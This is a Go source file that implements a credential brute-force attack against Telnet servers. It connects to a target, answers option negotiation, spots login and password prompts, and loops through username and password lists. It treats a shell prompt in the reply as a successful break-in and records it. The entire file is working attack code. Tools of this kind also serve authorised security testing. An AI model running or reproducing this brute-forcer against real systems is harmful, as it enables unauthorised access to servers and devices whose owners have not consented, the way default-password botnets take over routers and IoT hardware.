/*
This file implements brute-force attack against the Telnet protocol.

Usage:
	tc := NewTelnet(...)
	tc.Run()

Note:
	1. When linemode is disabled, we are supposed to send username in multiple packets,
		with one character in each. Since we have not encountered such case yet,
		username is sent in one packet for now.
	2. Telnet provides an Authentication Option: https://tools.ietf.org/html/rfc2941
		This is seldom implemented though (if you want better security, why not use ssh?)

Reference:
	https://tools.ietf.org/html/rfc854
	https://tools.ietf.org/html/rfc1184
*/

package main

import (
	"net"
	"strings"
	"time"
)

const (
	/* Basic telnet Commands */
	SE   byte = 240
	SB   byte = 250
	WILL byte = 251
	WONT byte = 252
	DO   byte = 253
	DONT byte = 254
	IAC  byte = 255

	LINEMODE byte = 34
)

type telnetConn struct {
	/* Connection */
	network string
	ip      string
	port    string
	timeout time.Duration
	conn    net.Conn

	/* Packet */
	message []byte
	length  int

	/* Account */
	*list         /* credential list for brute-force attack */
	skipuser bool /* if we should skip the current username */
}

/* create and initialize a new *telnetConn object */
func NewTelnet(network, ip, port string, timeout time.Duration, userlist, passlist []string) *telnetConn {
	var tc = &telnetConn{ip: ip, timeout: timeout, list: NewList(userlist, passlist)}

	/* default network tcp */
	if network == "" {
		tc.network = "tcp"
	} else {
		tc.network = network
	}

	/* default port 23 */
	if port == "" {
		tc.port = "23"
	} else {
		tc.port = port
	}

	return tc
}

/* the one-for-all telnet brute-force method,
   call directly after a telnetConn is initialized */
func (tc *telnetConn) Run() {
	var err error
	var goon = true

	for goon == true {
		/* initialize transport layer connection */
		tc.conn, err = net.DialTimeout(tc.network, tc.ip+":"+tc.port, tc.timeout)
		if err != nil {
			tc.WriteError("failed to connect to the server: %s", err)
			return
		}

		/* continue or not */
		goon = tc.login()

		tc.conn.Close()
	}
}

/************************************************************************
 *                              Try Login                               *
 ************************************************************************/

/* try login with given credential list within one connection,
   give multiple tries if the server allows */
func (tc *telnetConn) login() bool {
	for {
		if err := tc.read(); err != nil {
			tc.WriteError("failed to read message: %s", err)
			return false
		}
		buf, mes := tc.handleIAC()

		/* check login prompts */
		if len(mes) > 0 {
			if tc.isUserPrompt(mes) { /* found user prompt */
				return tc.loginUserPass(buf)
			} else if tc.isPassPrompt(mes) { /* found pass prompt */
				return tc.loginPass(buf)
			} else if tc.isSuccess(mes) { /* no authentication */
				tc.WriteResult(NOAUTH)
				return false
			}
		}

		/* negotiate options */
		if len(buf) > 0 {
			if err := tc.write(buf); err != nil {
				tc.WriteError("failed to send IAC response: %s", err)
				return false
			}
		}

	}
}

/* try login if both username and password are asked */
func (tc *telnetConn) loginUserPass(buf []byte) bool {
	var mes, user, pass string
	for {
		/* get password from the list */
		if tc.skipuser {
			user, pass = tc.NextUser()
		} else {
			user, pass = tc.NextCred()
		}

		/* send <username>\r to the server */
		if err := tc.write(append(append([]byte(user), '\r'), buf...)); err != nil {
			tc.WriteError("failed to send username: %s", err)
			return false
		}

		/* check server response */
		if err := tc.read(); err != nil {
			if err.Error() == "EOF" {
				tc.skipuser = true
				return tc.HasNextUser()
			} else {
				tc.WriteError("no response after sending username: %s", err)
				return false
			}
		}
		buf, mes = tc.handleIAC()

		/* the server should request password now */
		if tc.isFailure(mes) {
			if !tc.HasNextUser() {
				return false
			}
			tc.skipuser = true
			/* send next username if server allows */
			if tc.isUserPrompt(mes) {
				continue
			}
			return true
		}

		/* some telnet servers will close connections at this time */
		if !tc.isPassPrompt(mes) {
			tc.skipuser = true
			return tc.HasNextUser()
		}

		tc.skipuser = false

		/* send <password>\r (and IAC) to the server */
		if err := tc.write(append(append([]byte(pass), '\r'), buf...)); err != nil {
			tc.WriteError("failed to send password: %s", err)
			return false
		}

		/* check server response */
		if err := tc.read(); err != nil {
			if err.Error() == "EOF" {
				return tc.HasNextCred()
			} else {
				tc.WriteError("no response after sending password: %s", err)
				return false
			}

		}
		buf, mes = tc.handleIAC()

		/* login success, try next username */
		if tc.isSuccess(mes) {
			tc.WriteResult(PASS)
			tc.skipuser = true
			return tc.HasNextUser()
		}

		/* quit if credential list is exhausted */
		if !tc.HasNextCred() {
			return false
		}

		/* retry only if server allows */
		if !tc.isUserPrompt(mes) {
			return true
		}
	}
}

/* try login if only password is asked */
func (tc *telnetConn) loginPass(buf []byte) bool {
	var mes string
	for {
		/* get password from the list */
		pass := tc.NextPass()

		/* send <password>\r to the server */
		if err := tc.write(append(append([]byte(pass), '\r'), buf...)); err != nil {
			tc.WriteError("failed to send password: %s", err)
			return false
		}

		/* check server response */
		if err := tc.read(); err != nil {
			if err.Error() == "EOF" {
				return tc.HasNextPass()
			} else {
				tc.WriteError("no response after sending password: %s", err)
				return false
			}
		}
		buf, mes = tc.handleIAC()

		/* login success */
		if tc.isSuccess(mes) {
			tc.WriteResult(PASS)
			return tc.HasNextPass()
		}

		/* quit if password list is exhausted */
		if !tc.HasNextPass() {
			return false
		}

		/* retry only if server allows */
		if !tc.isPassPrompt(mes) {
			return true
		}
	}
}

/************************************************************************
 *                           Identify Prompts                           *
 ************************************************************************/

/* prompt for username */
func (tc *telnetConn) isUserPrompt(mes string) bool {
	return strings.Contains(string(mes), "username:") || strings.Contains(string(mes), "login:")
}

/* prompt for password */
func (tc *telnetConn) isPassPrompt(mes string) bool {
	return strings.Contains(string(mes), "password:")
}

/* prompt for successful login */
func (tc *telnetConn) isSuccess(mes string) bool {
	return len(mes) > 0 && (mes[len(mes)-1] == '>' || mes[len(mes)-1] == '#' || mes[len(mes)-1] == '$')
}

/* prompt for failed login */
func (tc *telnetConn) isFailure(mes string) bool {
	return strings.Contains(string(mes), "incorrect") || strings.Contains(string(mes), "fail")
}

/************************************************************************
 *                            Handle Packets                            *
 ************************************************************************/

/* read message from the server */
func (tc *telnetConn) read() error {
	/* the server may send mutiple packets at one time
	   a small delay is added to make they are all received */
	time.Sleep(200 * time.Millisecond)
	err := tc.conn.SetReadDeadline(time.Now().Add(tc.timeout))
	if err != nil {
		return err
	}

	buf := make([]byte, 1024)
	n, err := tc.conn.Read(buf)
	if err != nil {
		return err
	}

	tc.message = buf
	tc.length = n
	return nil
}

/* send response to the server */
func (tc *telnetConn) write(message []byte) error {
	err := tc.conn.SetWriteDeadline(time.Now().Add(tc.timeout))
	if err != nil {
		return err
	}

	_, err = tc.conn.Write(message)
	return err
}

/* build IAC response and return the remaining message */
func (tc *telnetConn) handleIAC() ([]byte, string) {
	buf := make([]byte, 0, tc.length)
	mes := make([]byte, 0, tc.length)

	for i := 0; i < tc.length-2; i++ {
		if tc.message[i] == IAC {
			i++
			switch tc.message[i] {
			/* reject all requests other than linemode */
			case WILL:
				i++
				if tc.message[i] == LINEMODE {
					buf = append(buf, IAC, DO, tc.message[i])
				} else {
					buf = append(buf, IAC, DONT, tc.message[i])
				}

			/* no response needed */
			case WONT, DONT:
				i++

			/* reject all requests other than linemode */
			case DO:
				i++
				if tc.message[i] == LINEMODE {
					buf = append(buf, IAC, WILL, tc.message[i])
				} else {
					buf = append(buf, IAC, WONT, tc.message[i])
				}

			/* ignore every subnegotiation */
			case SB:
				i++
				for tc.message[i] != SE && i < tc.length {
					i++
				}

			/* ignore all other commands */
			default:
			}
		} else {
			end := i + 1
			for end < tc.length && tc.message[end] != IAC {
				end++
			}
			mes = append(mes, tc.message[i:end]...)
			i = end - 1
		}
	}

	return buf, strings.ToLower(string(mes))
}
